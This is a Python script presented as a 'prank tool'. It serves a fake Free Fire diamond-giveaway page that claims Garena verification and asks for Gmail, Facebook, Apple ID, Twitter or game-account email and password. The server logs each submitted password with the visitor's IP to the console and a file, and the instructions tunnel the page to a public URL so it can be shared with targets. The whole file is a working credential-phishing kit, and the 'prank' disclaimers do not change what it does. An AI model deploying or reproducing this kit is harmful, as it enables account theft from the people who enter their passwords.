#!/usr/bin/env python3
# FF_HACK_TOOL.py - Professional Prank Tool

from http.server import HTTPServer, BaseHTTPRequestHandler
import html
import json
import os
import socket
import sys
from datetime import datetime
import time

# Configuration
PORT = 8080  # Changed to 8080
LOG_FILE = "ff_log.txt"

# Colors for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# Get local IP
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# Professional HTML Page
FAKE_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Free Fire Diamond Generator | Free 5000💎</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }

        /* Animated background */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at center, rgba(255,107,107,0.1) 0%, rgba(0,0,0,0) 100%);
            pointer-events: none;
            animation: pulse 4s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 0;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,107,107,0.2);
            text-align: center;
            max-width: 480px;
            width: 100%;
            overflow: hidden;
            animation: slideUp 0.6s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Header with Free Fire style */
        .ff-header {
            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 100%);
            padding: 25px 20px;
            position: relative;
            overflow: hidden;
        }

        .ff-header::before {
            content: '🔥';
            position: absolute;
            font-size: 100px;
            right: -20px;
            top: -20px;
            opacity: 0.2;
            transform: rotate(15deg);
        }

        .ff-header::after {
            content: '💎';
            position: absolute;
            font-size: 80px;
            left: -20px;
            bottom: -20px;
            opacity: 0.2;
            transform: rotate(-10deg);
        }

        .diamond-icon {
            font-size: 60px;
            animation: bounce 1s ease-in-out infinite;
            display: inline-block;
            filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3));
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        h1 {
            color: white;
            font-size: 28px;
            margin: 10px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            letter-spacing: 1px;
        }

        .subtitle {
            color: rgba(255,255,255,0.9);
            font-size: 14px;
        }

        /* Content area */
        .content {
            padding: 30px;
        }

        .offer-badge {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 10px;
            border-radius: 50px;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 20px;
            display: inline-block;
            animation: glow 2s ease-in-out infinite;
        }

        @keyframes glow {
            0%, 100% { box-shadow: 0 0 5px rgba(102,126,234,0.5); }
            50% { box-shadow: 0 0 20px rgba(102,126,234,0.8); }
        }

        .diamond-count {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 15px;
            margin-bottom: 20px;
            border: 2px solid #ff6b6b;
        }

        .amount {
            font-size: 36px;
            font-weight: bold;
            color: #ff6b6b;
        }

        .timer-warning {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 12px;
            margin: 20px 0;
            border-radius: 8px;
            font-size: 13px;
            color: #856404;
        }

        .input-group {
            margin: 20px 0;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #333;
            font-size: 14px;
        }

        .required-star {
            color: #ff6b6b;
        }

        input, select {
            width: 100%;
            padding: 14px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 15px;
            transition: all 0.3s;
            font-family: inherit;
        }

        input:focus, select:focus {
            outline: none;
            border-color: #ff6b6b;
            box-shadow: 0 0 0 3px rgba(255,107,107,0.1);
        }

        input.error {
            border-color: #ff6b6b;
            animation: shake 0.5s;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .validation-message {
            font-size: 12px;
            color: #ff6b6b;
            margin-top: 5px;
            display: none;
        }

        button {
            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 100%);
            color: white;
            padding: 14px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            margin-top: 10px;
            width: 100%;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255,107,107,0.3);
        }

        button:active {
            transform: translateY(0);
        }

        .warning {
            font-size: 11px;
            color: #888;
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid #e1e5e9;
        }

        .result {
            margin-top: 20px;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 10px;
            display: none;
            animation: fadeIn 0.5s;
            color: white;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .loading {
            display: none;
            margin-top: 15px;
            color: #ff6b6b;
        }

        .spinner {
            border: 3px solid rgba(255,107,107,0.3);
            border-radius: 50%;
            border-top: 3px solid #ff6b6b;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .success-icon {
            font-size: 50px;
            margin-bottom: 10px;
        }

        .timer-text {
            font-size: 20px;
            font-weight: bold;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="ff-header">
            <div class="diamond-icon">💎</div>
            <h1>FREE FIRE DIAMONDS</h1>
            <div class="subtitle">Official Giveaway 2026</div>
        </div>
        
        <div class="content">
            <div class="offer-badge">
                ⚡ LIMITED TIME OFFER ⚡
            </div>
            
            <div class="diamond-count">
                <div class="amount">+5000 💎</div>
                <div style="font-size: 12px; color: #666;">FREE DIAMONDS PACK</div>
            </div>
            
            <form id="prankForm">
                <div class="input-group">
                    <label>Select Account Type <span class="required-star">*</span></label>
                    <select id="accountType" required>
                        <option value="Gmail">Gmail Account</option>
                        <option value="Facebook">Facebook Account</option>
                        <option value="Apple ID">Apple ID</option>
                        <option value="Twitter">Twitter Account</option>
                        <option value="Free Fire">Free Fire Account</option>
                    </select>
                </div>
                
                <div class="input-group">
                    <label>Email / Gmail / Facebook ID <span class="required-star">*</span></label>
                    <input type="text" id="email" placeholder="example@gmail.com or username" required>
                    <div class="validation-message" id="emailError">
                        ⚠️ Please enter a valid email with @ (e.g., name@gmail.com)
                    </div>
                </div>
                
                <div class="input-group">
                    <label>Password <span class="required-star">*</span></label>
                    <input type="password" id="password" placeholder="••••••••" required>
                </div>
                
                <div class="timer-warning">
                    ⏰ <strong>Important:</strong> Diamonds will be credited after 1 hour verification process.
                    <br>Do not close this page until diamonds are added!
                </div>
                
                <button type="submit" id="submitBtn">
                    💎 CLAIM 5000 DIAMONDS NOW 💎
                </button>
            </form>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <div style="margin-top: 10px;">Processing request...</div>
            </div>
            
            <div id="result" class="result"></div>
            
            <div class="warning">
                🔒 256-bit SSL Encrypted | ✅ Verified by Garena<br>
                ⚠️ This is a PRANK! For entertainment only.
            </div>
        </div>
    </div>
    
    <script>
        document.getElementById('prankForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            let accountType = document.getElementById('accountType').value;
            let email = document.getElementById('email').value;
            let password = document.getElementById('password').value;
            
            // Validate email contains @
            let emailError = document.getElementById('emailError');
            let emailInput = document.getElementById('email');
            
            if (!email.includes('@')) {
                emailError.style.display = 'block';
                emailInput.classList.add('error');
                emailInput.focus();
                setTimeout(() => {
                    emailError.style.display = 'none';
                    emailInput.classList.remove('error');
                }, 3000);
                return;
            }
            
            // Hide error if shown
            emailError.style.display = 'none';
            emailInput.classList.remove('error');
            
            // Disable button and show loading
            let submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.6';
            document.getElementById('loading').style.display = 'block';
            
            // Send to server
            fetch('/log', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    accountType: accountType,
                    email: email, 
                    password: password,
                    timestamp: new Date().toISOString()
                })
            })
            .then(response => response.json())
            .then(data => {
                // Hide loading
                document.getElementById('loading').style.display = 'none';
                
                // Show success message with 1 hour timer
                let resultDiv = document.getElementById('result');
                resultDiv.style.display = 'block';
                resultDiv.innerHTML = `
                    <div class="success-icon">✅</div>
                    <strong>DIAMONDS RESERVED SUCCESSFULLY!</strong><br><br>
                    <div class="timer-text">⏰ 59:59 ⏰</div>
                    <strong>5000 Diamonds will be credited in:</strong><br>
                    <span id="countdown">1 hour 0 minutes</span><br><br>
                    <div style="font-size: 13px; margin-top: 10px;">
                        💎 Do not refresh this page!<br>
                        💎 Verification in progress...<br>
                        💎 Your diamonds are being processed
                    </div>
                    <br>
                    <small style="opacity: 0.8;">😂 JUST A PRANK! 😂<br>Your friend got you!</small>
                `;
                
                // Start countdown timer
                let timeLeft = 3600; // 1 hour in seconds
                let timer = setInterval(() => {
                    let hours = Math.floor(timeLeft / 3600);
                    let minutes = Math.floor((timeLeft % 3600) / 60);
                    let seconds = timeLeft % 60;
                    
                    if (timeLeft <= 0) {
                        clearInterval(timer);
                        document.getElementById('countdown').innerHTML = "🎉 Diamonds Added! 🎉";
                    } else {
                        if (hours > 0) {
                            document.getElementById('countdown').innerHTML = `${hours}h ${minutes}m ${seconds}s`;
                        } else {
                            document.getElementById('countdown').innerHTML = `${minutes}m ${seconds}s`;
                        }
                        document.querySelector('.timer-text').innerHTML = `⏰ ${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')} ⏰`;
                    }
                    timeLeft--;
                }, 1000);
                
                // Clear form
                document.getElementById('prankForm').reset();
                
                // Re-enable button after 5 seconds
                setTimeout(() => {
                    submitBtn.disabled = false;
                    submitBtn.style.opacity = '1';
                }, 5000);
            })
            .catch(error => {
                document.getElementById('loading').style.display = 'none';
                console.error('Error:', error);
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
                alert('Error connecting to server. Please try again.');
            });
        });
        
        // Real-time email validation
        document.getElementById('email').addEventListener('input', function() {
            let emailError = document.getElementById('emailError');
            let emailInput = document.getElementById('email');
            
            if (this.value.includes('@')) {
                emailError.style.display = 'none';
                emailInput.classList.remove('error');
            }
        });
    </script>
</body>
</html>
"""

class PrankHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        """Override to suppress default logging"""
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.end_headers()
            self.wfile.write(FAKE_PAGE.encode('utf-8'))
        elif self.path == '/health':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/log':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                
                # Log prank attempt
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                account_type = data.get('accountType', 'N/A')
                email = data.get('email', 'N/A')
                password = data.get('password', 'N/A')
                ip = self.client_address[0]
                
                # Create log entry
                log_entry = f"""
{Colors.RED}{'='*70}{Colors.RESET}
{Colors.YELLOW}[{timestamp}]{Colors.RESET} {Colors.GREEN}🎭 PRANK ATTEMPT{Colors.RESET}
{Colors.CYAN}📡 IP Address:{Colors.RESET} {ip}
{Colors.CYAN}📱 Account Type:{Colors.RESET} {account_type}
{Colors.CYAN}📧 Email/Username:{Colors.RESET} {Colors.BOLD}{email}{Colors.RESET}
{Colors.CYAN}🔑 Password:{Colors.RESET} {Colors.RED}{password}{Colors.RESET}
{Colors.RED}{'='*70}{Colors.RESET}
"""
                
                # Print to console with colors
                print(log_entry)
                
                # Append to log file
                with open(LOG_FILE, 'a') as f:
                    f.write(f"""
{'='*70}
[{timestamp}] PRANK ATTEMPT
  IP Address: {ip}
  Account Type: {account_type}
  Email/Username: {email}
  Password: {password}
{'='*70}
""")
                
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.RESET}")
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success', 'message': 'Prank logged!'}).encode())

def print_banner():
    """Print enhanced banner for the tool"""
    banner = f"""
{Colors.RED}{'█'*70}{Colors.RESET}
{Colors.RED}██{Colors.RESET}                                                                    {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}  {Colors.BOLD}{Colors.PURPLE}██████╗  █████╗ ██████╗  █████╗ ██████╗  ██████╗ ██╗  ██╗███████╗{Colors.RESET}  {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}  {Colors.BOLD}{Colors.PURPLE}██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔════╝{Colors.RESET}  {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}  {Colors.BOLD}{Colors.PURPLE}██████╔╝███████║██║  ██║███████║██████╔╝██║   ██║█████╔╝ ███████╗{Colors.RESET}  {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}  {Colors.BOLD}{Colors.PURPLE}██╔══██╗██╔══██║██║  ██║██╔══██║██╔══██╗██║   ██║██╔═██╗ ╚════██║{Colors.RESET}  {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}  {Colors.BOLD}{Colors.PURPLE}██║  ██║██║  ██║██████╔╝██║  ██║██║  ██║╚██████╔╝██║  ██╗███████║{Colors.RESET}  {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}  {Colors.BOLD}{Colors.PURPLE}╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝{Colors.RESET}  {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}                                                                    {Colors.RED}██{Colors.RESET}
{Colors.RED}{Colors.BOLD}{'█'*70}{Colors.RESET}
{Colors.CYAN}{Colors.BOLD}                    🔥 FF HACK TOOL v2.0 | PROFESSIONAL PRANK EDITION 🔥{Colors.RESET}
{Colors.YELLOW}{'─'*70}{Colors.RESET}
    """
    print(banner)

def main():
    # Clear screen for better presentation
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Print banner
    print_banner()
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD}║  ⚠️  PROFESSIONAL PRANK TOOL - FOR ENTERTAINMENT ONLY!              ║{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD}║  📝 Passwords are logged locally - Delete logs after prank!        ║{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD}╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    print(f"{Colors.CYAN}{Colors.BOLD}📋 INSTRUCTIONS:{Colors.RESET}")
    print(f"  {Colors.YELLOW}1.{Colors.RESET} Start this server: {Colors.GREEN}python3 ff_hack_tool.py{Colors.RESET}")
    print(f"  {Colors.YELLOW}2.{Colors.RESET} In a NEW terminal, run:")
    print(f"     {Colors.PURPLE}ssh -R 80:localhost:{PORT} ssh.localhost.run{Colors.RESET}")
    print(f"  {Colors.YELLOW}3.{Colors.RESET} Copy the public URL shown")
    print(f"  {Colors.YELLOW}4.{Colors.RESET} Share the URL with your friends!")
    print()
    
    # Start server
    local_ip = get_local_ip()
    print(f"{Colors.GREEN}{Colors.BOLD}✅ LOCAL SERVER:{Colors.RESET}")
    print(f"   📡 http://localhost:{PORT}")
    print(f"   📡 http://{local_ip}:{PORT}")
    print()
    print(f"{Colors.YELLOW}{Colors.BOLD}📝 LOG FILE:{Colors.RESET} {Colors.CYAN}{LOG_FILE}{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}⚠️  PRESS Ctrl+C TO STOP THE SERVER{Colors.RESET}")
    print(f"\n{Colors.DIM}{'═'*70}{Colors.RESET}\n")
    
    try:
        server = HTTPServer(('0.0.0.0', PORT), PrankHandler)
        print(f"{Colors.GREEN}{Colors.BOLD}🚀 SERVER STARTED ON PORT {PORT}{Colors.RESET}")
        print(f"{Colors.CYAN}🌐 Now run the SSH tunnel command in another terminal!{Colors.RESET}\n")
        print(f"{Colors.YELLOW}{Colors.BOLD}💀 Waiting for victims... I mean, friends! 🎭{Colors.RESET}\n")
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}{Colors.BOLD}👋 Server stopped. Prank over!{Colors.RESET}")
        if os.path.exists(LOG_FILE):
            print(f"\n{Colors.RED}💡 Delete log file: rm {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Goodbye!{Colors.RESET}\n")
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
        print(f"{Colors.YELLOW}Try: sudo python3 ff_hack_tool.py (if port already in use){Colors.RESET}")

if __name__ == "__main__":
    main()
